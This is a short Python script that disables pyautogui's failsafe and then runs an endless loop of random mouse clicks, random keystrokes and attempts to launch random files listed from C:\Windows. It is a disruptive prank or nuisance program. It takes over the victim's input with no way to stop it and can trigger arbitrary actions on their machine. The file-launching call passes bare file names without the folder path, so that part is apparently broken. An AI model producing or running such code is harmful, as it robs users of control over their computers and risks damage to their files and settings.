import os
import tkinter as tk
from tkinter import simpledialog    
import pyautogui
import random
import time
import string   

pyautogui.FAILSAFE = False

folderpath = 'C:\Windows'
#g = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
a = os.listdir(folderpath)


def simulate_random_click():
    while True:
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        pyautogui.click(x, y)
        key = random.choice(string.ascii_letters)
        pyautogui.press(key)
        b = random.choice(a)
        os.startfile(b)





def main():
    while True:
        
        simulate_random_click()
        
        

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    main()

